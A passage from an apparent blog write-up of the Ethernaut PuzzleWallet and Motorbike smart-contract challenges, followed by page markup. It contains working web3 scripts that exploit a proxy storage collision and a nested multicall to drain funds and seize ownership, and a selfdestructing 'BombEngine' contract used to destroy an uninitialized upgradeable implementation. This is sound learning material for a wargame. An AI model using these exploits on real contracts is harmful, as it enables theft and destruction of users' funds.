      // Can change the storage slot[1]
      function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      // contract&#x27;s balance should be 0, but wait how much is it now ? 
      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);
      ...

      // only owner can add to white list
      function addToWhitelist(address addr) external {
        require(msg.sender == owner, &quot;Not the owner&quot;);
        ...

        // You should be in whitelisted to be here
        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
            ...
            assembly {
                // for more low level ops
                selector := mload(add(_data, 32))
            }
            ...
            // deposit can only be called once 
            if (selector == this.deposit.selector) {
                require(!depositCalled, &quot;Deposit can only be called once&quot;);
                // Protect against reusing msg.value
                depositCalled = true;
            }
            ...
            // To not mistake it for the normal contract to contract delegate let&#x27;s call it selfDelegate.
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, &quot;Error while delegating call&quot;);
        }
    }
}


```

Following the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.

```js
  let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
```

Okay let&#x27;s sum it up in a diagram.

![PuzzleWallet diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc_e13u24.png)  

delegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let&#x27;s inspect the storage layout for both contracts.

![PuzzleWallet storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138027/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e_t0ouln.png)  

`owner` and `pendingAdmin` both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we `puzzleWalletAddress.delegateCall` we became the owner of the puzzleWallet contract ! huuuge.

We will be using the `proposeNewAdmin` to set the `pendingAdmin` value.

Okay so now we can execute `owner` functions. Let&#x27;s not forget our goal is to become the `owner` of the *Proxy* contract. Let&#x27;s look for the function that can set `slot[1]` of the storage in both contracts.

```js
 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      // contract&#x27;s balance should be 0, but wait how much is it now ? 
      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);
      ...
 }
```

So first of all we need to be `whitelisted`. We can do that

```js
await contract.addToWhitelist(player);
```

Second we need to make the contract balance to 0. `await web3.eth.getBalance(instance)` will return **0.001** ethers as balance. The `execute` function won&#x27;t allow such a thing as we can only withdraw what we did deposit (It&#x27;s tracked in storage variable `balances`). The only way to drain funds is to have more `balance` than the amount we deposited.

If we can&#x27;t call deposit multiple times in one `multicall` how about we do it but by adding another layer of `multicall`

![PuzzleWallet call hiearchy](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d_ggsn87.png)  

This allows to have the double of the msg.value as balance. Okay so we said we had **0.001** ethers as contract balance ? let&#x27;s deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract&#x27;s ) . By having the contract&#x27;s balance as 0 we can simply set the owner ow I mean maxBalance to our player account to **hijack the proxy**.

-----
**Exploitation**

1. become the owner of the contract
2. become whitelisted
3. deposit the balance of the contract with multiple calls
4. withdraw all funds
5. setMaxBalance as our address

&gt; The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don&#x27;t get confused the address is the proxy&#x27;s !

```js
const proposeAdminCall= web3.eth.abi.encodeFunctionCall({
name: &#x27;proposeNewAdmin&#x27;,
    type: &#x27;function&#x27;,
    inputs: [
        {
            type: &#x27;address&#x27;,
            name: &#x27;_newAdmin&#x27;
        }
    ]
},player)

await web3.eth.sendTransaction({data:proposeAdminCall,from:player,to:instance});

await contract.addToWhitelist(player);

// getting the deposit call data

const depositData = (await contract.methods(&#x27;deposit()&#x27;).request()).data

const multiCallData = (await contract.methods(&#x27;multicall(bytes[])&#x27;).request([depositData])).data

await contract.multicall([multicallData,multicallData],{value:toWei(&#x27;0.001&#x27;)}); // adding to our balance

await contract.execute(player,toWei(&#x27;0.002&#x27;),&#x27;0x0&#x27;); // Draining funds

await contract.setMaxBalance(player) // It will convert upon call 
```

Challenge solved ✅

## Motorbike

**Challenge description**

&gt; Ethernaut&#x27;s motorbike has a brand new upgradeable engine design. 
&gt;  Would you be able to selfdestruct its engine and make the motorbike unusable ?
&gt;Things that might help:
    EIP-1967
    UUPS upgradeable pattern
    Initializable contract

**Analysis**

To solve this challenge, we need to be familiar with both [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) and most importantly  the [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)

After going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.

![Motorbike Diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23_usrhte.png)  

After drawing the diagram, I had many unanswered questions the most important one did we `initialize` the engine contract or not !
I really know where the address of the *Engine* contract is in storage so I can check that !

```js
const engineAddress = await web3.eth.getStorageAt(instance,&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;);

// let&#x27;s check the value
await web3.eth.call({to:engineAddress,from:player,data:web3.eth.abi.encodeFunctionSignature(&#x27;upgrader()&#x27;)})
// returned 0x000000
// the initialize() wasn&#x27;t called and that&#x27;s our -----
**Exploitation** !
```


**Exploitation**

1. initialize the *Engine* contract so we become the **upgrader**.
2. upgrade our *Engine* contract to our bomb contract ( which will selfdestruct )
3. call selfdestruct, the call will be done through *delegateCall* so the actual *Engine* will be destructed !

our evil contract

```js
contract BombEngine { 
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function destruct() public {
        selfdestruct( payable ( 0x84e7a3679A82C2766Ff8382862ab883FF9460307));
    }
}
```

```js
const destructData= web3.eth.abi.encodeFunctionSignature(&#x27;destruct()&#x27;);

const data= web3.eth.abi.encodeFunctionCall({
    name: &#x27;upgradeToAndCall&#x27;,
    type: &#x27;function&#x27;,
    inputs: [{
        type: &#x27;address&#x27;,
        name: &#x27;newImplementation&#x27;
    },{
        type: &#x27;bytes&#x27;,
        name: &#x27;data&#x27;
    }]
}, [bombEngineAddress,destructData]);

await web3.eth.sendTransaction({to:engineAddress,from:player,data:data})

// You can do a random call to the Engine contract it will revert because it&#x27;s gone !
```

Challenge solved ✅

"/><meta property="og:image" content="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139052/small_openzeppelin_ethernaut_c431a176dd.pn"/><meta name="google-site-verification" content="8uYSPvcdlfOzE8ienPTU-uSpjLTnUIyRKDOBDnlzWmg"/><link rel="icon" href="/favicon.ico"/><meta name="next-head-count" content="10"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true"/><link href="/fonts/Inversionz_Unboxed.ttf"/><link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/4e8ce417027ce9fd.css" as="style"/><link rel="stylesheet" href="/_next/static/css/4e8ce417027ce9fd.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-cb7634a8b6194820.js" defer=""></script><script src="/_next/static/chunks/framework-bb5c596eafb42b22.js" defer=""></script><script src="/_next/static/chunks/main-7d56226aa235ba8d.js" defer=""></script><script src="/_next/static/chunks/pages/_app-67eaf2f8eab9cd46.js" defer=""></script><script src="/_next/static/chunks/d7eeaac4-bfe9755f1bf975fd.js" defer=""></script><script src="/_next/static/chunks/386-6717aabe367a6d08.js" defer=""></script><script src="/_next/static/chunks/51-d003c1d266fa4195.js" defer=""></script><script src="/_next/static/chunks/934-578fd7722a3726cf.js" defer=""></script><script src="/_next/static/chunks/803-9857b6c9f5157efd.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-5dde6950f5b739f0.js" defer=""></script><script src="/_next/static/0ISm-a3DlXowWUoWCA_lL/_buildManifest.js" defer=""></script><script src="/_next/static/0ISm-a3DlXowWUoWCA_lL/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Iceland&display=swap">@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPWK8.woff) format('woff')}@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style><style data-href="https://fonts.googleapis.com/css2?family=Iceland&family=Sen:wght@400;700;800&display=swap">@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPWK8.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_HmA.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CoKQ.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OoKQ.woff) format('woff')}@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_3kvWNAGn5LEwJ.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_3nPWNAGn5LA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CYI0v0BnYASNr7.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CYLUv0BnYASA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OYI0v0BnYASNr7.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OYLUv0BnYASA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next" data-reactroot=""><style data-emotion="css-global 3v2x1q">:host,:root{--chakra-ring-inset:var(--chakra-empty,/*!*/ /*!*/);--chakra-ring-offset-width:0px;--chakra-ring-offset-color:#fff;--chakra-ring-color:rgba(66, 153, 225, 0.6);--chakra-ring-offset-shadow:0 0 #0000;--chakra-ring-shadow:0 0 #0000;--chakra-space-x-reverse:0;--chakra-space-y-reverse:0;--chakra-colors-transparent:transparent;--chakra-colors-current:currentColor;--chakra-colors-black:#000000;--chakra-colors-white:#FFFFFF;--chakra-colors-whiteAlpha-50:rgba(255, 255, 255, 0.04);--chakra-colors-whiteAlpha-100:rgba(255, 255, 255, 0.06);--chakra-colors-whiteAlpha-200:rgba(255, 255, 255, 0.08);--chakra-colors-whiteAlpha-300:rgba(255, 255, 255, 0.16);--chakra-colors-whiteAlpha-400:rgba(255, 255, 255, 0.24);--chakra-colors-whiteAlpha-500:rgba(255, 255, 255, 0.36);--chakra-colors-whiteAlpha-600:rgba(255, 255, 255, 0.48);--chakra-colors-whiteAlpha-700:rgba(255, 255, 255, 0.64);--chakra-colors-whiteAlpha-800:rgba(255, 255, 255, 0.80);--chakra-colors-whiteAlpha-900:rgba(255, 255, 255, 0.92);--chakra-colors-blackAlpha-50:rgba(0, 0, 0, 0.04);--chakra-colors-blackAlpha-100:rgba(0, 0, 0, 0.06);--chakra-colors-blackAlpha-200:rgba(0, 0, 0, 0.08);--chakra-colors-blackAlpha-300:rgba(0, 0, 0, 0.16);--chakra-colors-blackAlpha-400:rgba(0, 0, 0, 0.24);--chakra-colors-blackAlpha-500:rgba(0, 0, 0, 0.36);--chakra-colors-blackAlpha-600:rgba(0, 0, 0, 0.48);--chakra-colors-blackAlpha-700:rgba(0, 0, 0, 0.64);--chakra-colors-blackAlpha-800:rgba(0, 0, 0, 0.80);--chakra-colors-blackAlpha-900:rgba(0, 0, 0, 0.92);--chakra-colors-gray-50:#F7FAFC;--chakra-colors-gray-100:#EDF2F7;--chakra-colors-gray-200:#E2E8F0;--chakra-colors-gray-300:#CBD5E0;--chakra-colors-gray-400:#A0AEC0;--chakra-colors-gray-500:#718096;--chakra-colors-gray-600:#4A5568;--chakra-colors-gray-700:#2D3748;--chakra-colors-gray-800:#1A202C;--chakra-colors-gray-900:#171923;--chakra-colors-red-50:#FFF5F5;--chakra-colors-red-100:#FED7D7;--chakra-colors-red-200:#FEB2B2;--chakra-colors-red-300:#FC8181;--chakra-colors-red-400:#F56565;--chakra-colors-red-500:#E53E3E;--chakra-colors-red-600:#C53030;--chakra-colors-red-700:#9B2C2C;--chakra-colors-red-800:#822727;--chakra-colors-red-900:#63171B;--chakra-colors-orange-50:#FFFAF0;--chakra-colors-orange-100:#FEEBC8;--chakra-colors-orange-200:#FBD38D;--chakra-colors-orange-300:#F6AD55;--chakra-colors-orange-400:#ED8936;--chakra-colors-orange-500:#DD6B20;--chakra-colors-orange-600:#C05621;--chakra-colors-orange-700:#9C4221;--chakra-colors-orange-800:#7B341E;--chakra-colors-orange-900:#652B19;--chakra-colors-yellow-50:#FFFFF0;--chakra-colors-yellow-100:#FEFCBF;--chakra-colors-yellow-200:#FAF089;--chakra-colors-yellow-300:#F6E05E;--chakra-colors-yellow-400:#ECC94B;--chakra-colors-yellow-500:#D69E2E;--chakra-colors-yellow-600:#B7791F;--chakra-colors-yellow-700:#975A16;--chakra-colors-yellow-800:#744210;--chakra-colors-yellow-900:#5F370E;--chakra-colors-green-50:#F0FFF4;--chakra-colors-green-100:#C6F6D5;--chakra-colors-green-200:#9AE6B4;--chakra-colors-green-300:#68D391;--chakra-colors-green-400:#48BB78;--chakra-colors-green-500:#38A169;--chakra-colors-green-600:#2F855A;--chakra-colors-green-700:#276749;--chakra-colors-green-800:#22543D;--chakra-colors-green-900:#1C4532;--chakra-colors-teal-50:#E6FFFA;--chakra-colors-teal-100:#B2F5EA;--chakra-colors-teal-200:#81E6D9;--chakra-colors-teal-300:#4FD1C5;--chakra-colors-teal-400:#38B2AC;--chakra-colors-teal-500:#319795;--chakra-colors-teal-600:#2C7A7B;--chakra-colors-teal-700:#285E61;--chakra-colors-teal-800:#234E52;--chakra-colors-teal-900:#1D4044;--chakra-colors-blue-50:#ebf8ff;--chakra-colors-blue-100:#bee3f8;--chakra-colors-blue-200:#90cdf4;--chakra-colors-blue-300:#63b3ed;--chakra-colors-blue-400:#4299e1;--chakra-colors-blue-500:#3182ce;--chakra-colors-blue-600:#2b6cb0;--chakra-colors-blue-700:#2c5282;--chakra-colors-blue-800:#2a4365;--chakra-colors-blue-900:#1A365D;--chakra-colors-cyan-50:#EDFDFD;--chakra-colors-cyan-100:#C4F1F9;--chakra-colors-cyan-200:#9DECF9;--chakra-colors-cyan-300:#76E4F7;--chakra-colors-cyan-400:#0BC5EA;--chakra-colors-cyan-500:#00B5D8;--chakra-colors-cyan-600:#00A3C4;--chakra-colors-cyan-700:#0987A0;--chakra-colors-cyan-800:#086F83;--chakra-colors-cyan-900:#065666;--chakra-colors-purple-50:#FAF5FF;--chakra-colors-purple-100:#E9D8FD;--chakra-colors-purple-200:#D6BCFA;--chakra-colors-purple-300:#B794F4;--chakra-colors-purple-400:#9F7AEA;--chakra-colors-purple-500:#805AD5;--chakra-colors-purple-600:#6B46C1;--chakra-colors-purple-700:#553C9A;--chakra-colors-purple-800:#44337A;--chakra-colors-purple-900:#322659;--chakra-colors-pink-50:#FFF5F7;--chakra-colors-pink-100:#FED7E2;--chakra-colors-pink-200:#FBB6CE;--chakra-colors-pink-300:#F687B3;--chakra-colors-pink-400:#ED64A6;--chakra-colors-pink-500:#D53F8C;--chakra-colors-pink-600:#B83280;--chakra-colors-pink-700:#97266D;--chakra-colors-pink-800:#702459;--chakra-colors-pink-900:#521B41;--chakra-colors-linkedin-50:#E8F4F9;--chakra-colors-linkedin-100:#CFEDFB;--chakra-colors-linkedin-200:#9BDAF3;--chakra-colors-linkedin-300:#68C7EC;--chakra-colors-linkedin-400:#34B3E4;--chakra-colors-linkedin-500:#00A0DC;--chakra-colors-linkedin-600:#008CC9;--chakra-colors-linkedin-700:#0077B5;--chakra-colors-linkedin-800:#005E93;--chakra-colors-linkedin-900:#004471;--chakra-colors-facebook-50:#E8F4F9;--chakra-colors-facebook-100:#D9DEE9;--chakra-colors-facebook-200:#B7C2DA;--chakra-colors-facebook-300:#6482C0;--chakra-colors-facebook-400:#4267B2;--chakra-colors-facebook-500:#385898;--chakra-colors-facebook-600:#314E89;--chakra-colors-facebook-700:#29487D;--chakra-colors-facebook-800:#223B67;--chakra-colors-facebook-900:#1E355B;--chakra-colors-messenger-50:#D0E6FF;--chakra-colors-messenger-100:#B9DAFF;--chakra-colors-messenger-200:#A2CDFF;--chakra-colors-messenger-300:#7AB8FF;--chakra-colors-messenger-400:#2E90FF;--chakra-colors-messenger-500:#0078FF;--chakra-colors-messenger-600:#0063D1;--chakra-colors-messenger-700:#0052AC;--chakra-colors-messenger-800:#003C7E;--chakra-colors-messenger-900:#002C5C;--chakra-colors-whatsapp-50:#dffeec;--chakra-colors-whatsapp-100:#b9f5d0;--chakra-colors-whatsapp-200:#90edb3;--chakra-colors-whatsapp-300:#65e495;--chakra-colors-whatsapp-400:#3cdd78;--chakra-colors-whatsapp-500:#22c35e;--chakra-colors-whatsapp-600:#179848;--chakra-colors-whatsapp-700:#0c6c33;--chakra-colors-whatsapp-800:#01421c;--chakra-colors-whatsapp-900:#001803;--chakra-colors-twitter-50:#E5F4FD;--chakra-colors-twitter-100:#C8E9FB;--chakra-colors-twitter-200:#A8DCFA;--chakra-colors-twitter-300:#83CDF7;--chakra-colors-twitter-400:#57BBF5;--chakra-colors-twitter-500:#1DA1F2;--chakra-colors-twitter-600:#1A94DA;--chakra-colors-twitter-700:#1681BF;--chakra-colors-twitter-800:#136B9E;--chakra-colors-twitter-900:#0D4D71;--chakra-colors-telegram-50:#E3F2F9;--chakra-colors-telegram-100:#C5E4F3;--chakra-colors-telegram-200:#A2D4EC;--chakra-colors-telegram-300:#7AC1E4;--chakra-colors-telegram-400:#47A9DA;--chakra-colors-telegram-500:#0088CC;--chakra-colors-telegram-600:#007AB8;--chakra-colors-telegram-700:#006BA1;--chakra-colors-telegram-800:#005885;--chakra-colors-telegram-900:#003F5E;--chakra-colors-darkBackground:#16222A;--chakra-colors-lightSecondary:#143258;--chakra-colors-cardDark:#25313A;--chakra-colors-cardDark2:#293640;--chakra-colors-darkSecondary:#CFE4FF;--chakra-colors-lightBackground:#ECEEF1;--chakra-borders-none:0;--chakra-borders-1px:1px solid;--chakra-borders-2px:2px solid;--chakra-borders-4px:4px solid;--chakra-borders-8px:8px solid;--chakra-fonts-heading:Iceland;--chakra-fonts-body:Iceland;--chakra-fonts-mono:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--chakra-fonts-display:Inversionz Unboxed;--chakra-fontSizes-xs:0.75rem;--chakra-fontSizes-sm:0.875rem;--chakra-fontSizes-md:1rem;--chakra-fontSizes-lg:1.125rem;--chakra-fontSizes-xl:1.25rem;--chakra-fontSizes-2xl:1.5rem;--chakra-fontSizes-3xl:1.875rem;--chakra-fontSizes-4xl:2.25rem;--chakra-fontSizes-5xl:3rem;--chakra-fontSizes-6xl:3.75rem;--chakra-fontSizes-7xl:4.5rem;--chakra-fontSizes-8xl:6rem;--chakra-fontSizes-9xl:8rem;--chakra-fontWeights-hairline:100;--chakra-fontWeights-thin:200;--chakra-fontWeights-light:300;--chakra-fontWeights-normal:400;--chakra-fontWeights-medium:500;--chakra-fontWeights-semibold:600;--chakra-fontWeights-bold:700;--chakra-fontWeights-extrabold:800;--chakra-fontWeights-black:900;--chakra-letterSpacings-tighter:-0.05em;--chakra-letterSpacings-tight:-0.025em;--chakra-letterSpacings-normal:0;--chakra-letterSpacings-wide:0.025em;--chakra-letterSpacings-wider:0.05em;--chakra-letterSpacings-widest:0.1em;--chakra-lineHeights-3:.75rem;--chakra-lineHeights-4:1rem;--chakra-lineHeights-5:1.25rem;--chakra-lineHeights-6:1.5rem;--chakra-lineHeights-7:1.75rem;--chakra-lineHeights-8:2rem;--chakra-lineHeights-9:2.25rem;--chakra-lineHeights-10:2.5rem;--chakra-lineHeights-normal:normal;--chakra-lineHeights-none:1;--chakra-lineHeights-shorter:1.25;--chakra-lineHeights-short:1.375;--chakra-lineHeights-base:1.5;--chakra-lineHeights-tall:1.625;--chakra-lineHeights-taller:2;--chakra-radii-none:0;--chakra-radii-sm:0.125rem;--chakra-radii-base:0.25rem;--chakra-radii-md:0.375rem;--chakra-radii-lg:0.5rem;--chakra-radii-xl:0.75rem;--chakra-radii-2xl:1rem;--chakra-radii-3xl:1.5rem;--chakra-radii-full:9999px;--chakra-space-1:0.25rem;--chakra-space-2:0.5rem;--chakra-space-3:0.75rem;--chakra-space-4:1rem;--chakra-space-5:1.25rem;--chakra-space-6:1.5rem;--chakra-space-7:1.75rem;--chakra-space-8:2rem;--chakra-space-9:2.25rem;--chakra-space-10:2.5rem;--chakra-space-12:3rem;--chakra-space-14:3.5rem;--chakra-space-16:4rem;--chakra-space-20:5rem;--chakra-space-24:6rem;--chakra-space-28:7rem;--chakra-space-32:8rem;--chakra-space-36:9rem;--chakra-space-40:10rem;--chakra-space-44:11rem;--chakra-space-48:12rem;--chakra-space-52:13rem;--chakra-space-56:14rem;--chakra-space-60:15rem;--chakra-space-64:16rem;--chakra-space-72:18rem;--chakra-space-80:20rem;--chakra-space-96:24rem;--chakra-space-px:1px;--chakra-space-0\.5:0.125rem;--chakra-space-1\.5:0.375rem;--chakra-space-2\.5:0.625rem;--chakra-space-3\.5:0.875rem;--chakra-shadows-xs:0 0 0 1px rgba(0, 0, 0, 0.05);--chakra-shadows-sm:0 1px 2px 0 rgba(0, 0, 0, 0.05);--chakra-shadows-base:0 1px 3px 0 rgba(0, 0, 0, 0.1),0 1px 2px 0 rgba(0, 0, 0, 0.06);--chakra-shadows-md:0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);--chakra-shadows-lg:0 10px 15px -3px rgba(0, 0, 0, 0.1),0 4px 6px -2px rgba(0, 0, 0, 0.05);--chakra-shadows-xl:0 20px 25px -5px rgba(0, 0, 0, 0.1),0 10px 10px -5px rgba(0, 0, 0, 0.04);--chakra-shadows-2xl:0 25px 50px -12px rgba(0, 0, 0, 0.25);--chakra-shadows-outline:0 0 0 3px rgba(66, 153, 225, 0.6);--chakra-shadows-inner:inset 0 2px 4px 0 rgba(0,0,0,0.06);--chakra-shadows-none:none;--chakra-shadows-dark-lg:rgba(0, 0, 0, 0.1) 0px 0px 0px 1px,rgba(0, 0, 0, 0.2) 0px 5px 10px,rgba(0, 0, 0, 0.4) 0px 15px 40px;--chakra-sizes-1:0.25rem;--chakra-sizes-2:0.5rem;--chakra-sizes-3:0.75rem;--chakra-sizes-4:1rem;--chakra-sizes-5:1.25rem;--chakra-sizes-6:1.5rem;--chakra-sizes-7:1.75rem;--chakra-sizes-8:2rem;--chakra-sizes-9:2.25rem;--chakra-sizes-10:2.5rem;--chakra-sizes-12:3rem;--chakra-sizes-14:3.5rem;--chakra-sizes-16:4rem;--chakra-sizes-20:5rem;--chakra-sizes-24:6rem;--chakra-sizes-28:7rem;--chakra-sizes-32:8rem;--chakra-sizes-36:9rem;--chakra-sizes-40:10rem;--chakra-sizes-44:11rem;--chakra-sizes-48:12rem;--chakra-sizes-52:13rem;--chakra-sizes-56:14rem;--chakra-sizes-60:15rem;--chakra-sizes-64:16rem;--chakra-sizes-72:18rem;--chakra-sizes-80:20rem;--chakra-sizes-96:24rem;--chakra-sizes-px:1px;--chakra-sizes-0\.5:0.125rem;--chakra-sizes-1\.5:0.375rem;--chakra-sizes-2\.5:0.625rem;--chakra-sizes-3\.5:0.875rem;--chakra-sizes-max:max-content;--chakra-sizes-min:min-content;--chakra-sizes-full:100%;--chakra-sizes-3xs:14rem;--chakra-sizes-2xs:16rem;--chakra-sizes-xs:20rem;--chakra-sizes-sm:24rem;--chakra-sizes-md:28rem;--chakra-sizes-lg:32rem;--chakra-sizes-xl:36rem;--chakra-sizes-2xl:42rem;--chakra-sizes-3xl:48rem;--chakra-sizes-4xl:56rem;--chakra-sizes-5xl:64rem;--chakra-sizes-6xl:72rem;--chakra-sizes-7xl:80rem;--chakra-sizes-8xl:90rem;--chakra-sizes-container-sm:640px;--chakra-sizes-container-md:768px;--chakra-sizes-container-lg:1024px;--chakra-sizes-container-xl:1280px;--chakra-zIndices-hide:-1;--chakra-zIndices-auto:auto;--chakra-zIndices-base:0;--chakra-zIndices-docked:10;--chakra-zIndices-dropdown:1000;--chakra-zIndices-sticky:1100;--chakra-zIndices-banner:1200;--chakra-zIndices-overlay:1300;--chakra-zIndices-modal:1400;--chakra-zIndices-popover:1500;--chakra-zIndices-skipLink:1600;--chakra-zIndices-toast:1700;--chakra-zIndices-tooltip:1800;--chakra-transition-property-common:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform;--chakra-transition-property-colors:background-color,border-color,color,fill,stroke;--chakra-transition-property-dimensions:width,height;--chakra-transition-property-position:left,right,top,bottom;--chakra-transition-property-background:background-color,background-image,background-position;--chakra-transition-easing-ease-in:cubic-bezier(0.4, 0, 1, 1);--chakra-transition-easing-ease-out:cubic-bezier(0, 0, 0.2, 1);--chakra-transition-easing-ease-in-out:cubic-bezier(0.4, 0, 0.2, 1);--chakra-transition-duration-ultra-fast:50ms;--chakra-transition-duration-faster:100ms;--chakra-transition-duration-fast:150ms;--chakra-transition-duration-normal:200ms;--chakra-transition-duration-slow:300ms;--chakra-transition-duration-slower:400ms;--chakra-transition-duration-ultra-slow:500ms;--chakra-blur-none:0;--chakra-blur-sm:4px;--chakra-blur-base:8px;--chakra-blur-md:12px;--chakra-blur-lg:16px;--chakra-blur-xl:24px;--chakra-blur-2xl:40px;--chakra-blur-3xl:64px;}</style><style data-emotion="css-global 1jqlf9g">html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:system-ui,sans-serif;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;-moz-osx-font-smoothing:grayscale;touch-action:manipulation;}body{position:relative;min-height:100%;font-feature-settings:'kern';}*,*::before,*::after{border-width:0;border-style:solid;box-sizing:border-box;}main{display:block;}hr{border-top-width:1px;box-sizing:content-box;height:0;overflow:visible;}pre,code,kbd,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:1em;}a{background-color:transparent;color:inherit;-webkit-text-decoration:inherit;text-decoration:inherit;}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;-webkit-text-decoration:underline dotted;text-decoration:underline 